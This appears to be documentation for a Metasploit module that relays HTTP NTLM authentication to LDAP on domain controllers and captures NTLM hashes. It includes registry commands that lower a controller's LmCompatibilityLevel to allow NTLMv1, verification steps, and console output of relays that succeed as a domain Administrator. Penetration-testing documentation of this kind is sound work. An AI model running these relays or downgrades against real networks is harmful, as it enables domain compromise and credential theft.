## Vulnerable Application

### Description

This module sets up an HTTP server that attempts to execute an NTLM relay attack against an LDAP server on the
configured `RHOSTS`. Both NTLMv1 and NTLMv2 can be relayed. NTLMv2 clients must not request NTLM signing or sealing:
the relay preserves the original negotiate and authenticate messages, including the Message Integrity Check (MIC).
Rewriting a MIC-protected handshake invalidates it. The module retains flag removal for NTLMv1 clients that request signing.

Windows `curl.exe --ntlm` can relay NTLMv2 without requesting signing. Windows `Invoke-WebRequest` and WinHTTP clients
can request signing and therefore cannot provide a usable NTLMv2 LDAP relay session through this module. The target
must allow unsigned LDAP operations; a successful bind alone does not prove that the resulting session is usable.

This module supports relaying one HTTP authentication attempt to multiple LDAP servers. After attempting to relay to
one target, the relay server sends a 307 to the client and if the client is configured to respond to redirects, the
client resends the NTLMSSP_NEGOTIATE request to the relay server. Multi relay will not work if the client does not
respond to redirects.

The module supports relaying NTLM authentication which has been wrapped in GSS-SPNEGO. HTTP authentication info is sent
in the WWW-Authenticate header. In the auth header base64 encoded NTLM messages are denoted with the NTLM prefix, while
GSS wrapped NTLM messages are denoted with the Negotiate prefix. Note that in some cases non-GSS wrapped NTLM auth can
be prefixed with Negotiate.

If the relay attack is successful, an LDAP session is created on the target. This session can be used by other modules
that support LDAP sessions, such as:

- `admin/ldap/rbcd`
- `auxiliary/gather/ldap_query`

The module also supports capturing NTLMv1 and NTLMv2 hashes.

### Setup

For this relay attack to be successful, it is important to understand the difference between the Target Server (the
Domain Controller receiving the relayed authentication) and the Victim Client (the machine sending the initial HTTP
request) and how their respective configurations can impact the success of the attack.

For NTLMv1, the Domain Controller must accept NTLM authentication. Its `LmCompatibilityLevel` registry value must be
4 or lower. Level `5` ("Send NTLMv2 response only. Refuse LM and NTLM") rejects NTLMv1 but permits NTLMv2. The target's
`Domain controller: LDAP server signing requirements` policy must be `None` for either version.

You can verify or modify the Domain Controller's level using the following commands:
```cmd
REM To check the current level:
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel

REM To permit NTLMv1 by setting the level to 4 (or lower):
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 0x4 /f
```

The client being coerced must be willing to send the vulnerable NTLM responses.
- Non-Windows clients: Their NTLM implementation controls the response version and signing flags independently of Windows policy.
- Windows clients: `LmCompatibilityLevel` controls the response version, while the HTTP application's SSPI context
  requirements determine whether it requests signing. Use level `2` to test NTLMv1 and level `5` to test NTLMv2. Windows
  `curl.exe --ntlm --user 'DOMAIN\username:password' http://192.0.2.1/test` can supply unsigned NTLM authentication for both
  versions. `Invoke-WebRequest` works for NTLMv1 with flag removal; its signed, MIC-protected NTLMv2 handshake cannot be
  downgraded by this relay.

## Options

### RANDOMIZE_TARGETS

Randomize the order of the relay targets. Defaults to `true`.

### SessionKeepalive

Interval in seconds between protocol keepalive messages for a created LDAP session. Defaults to `600`.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/server/relay/http_to_ldap`
3. Set the `RHOSTS` options
4. Run the module
5. Send an authentication attempt to the relay server
   6. `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
7. Check the output for successful relays and captured hashes

## Scenarios
### Relaying to multiple targets
```
msf auxiliary(server/relay/http_to_ldap) > set rhosts 172.16.199.200 172.16.199.201
rhosts => 172.16.199.200 172.16.199.201
msf auxiliary(server/relay/http_to_ldap) > run
[*] Auxiliary module running as background job 2.

[*] Relay Server started on 0.0.0.0:80
[*] Server started.
msf auxiliary(server/relay/http_to_ldap) > [*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to ldap://172.16.199.201:389
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[*] Received type2 from target ldap://172.16.199.201:389, attempting to relay back to client
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
[+] Relay succeeded
[*] Moving to next target (172.16.199.200). Issuing 307 Redirect to /ZdF7Ufkm0I
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to ldap://172.16.199.200:389
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[*] Received type2 from target ldap://172.16.199.200:389, attempting to relay back to client
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
[+] Relay succeeded
[*] Target list exhausted for 172.16.199.130. Closing connection.
msf auxiliary(server/relay/http_to_ldap) > sessions -i -1
[*] Starting interaction with 5...

LDAP (172.16.199.200) > getuid
[*] Server username: KERBEROS\Administrator
LDAP (172.16.199.200) >
```
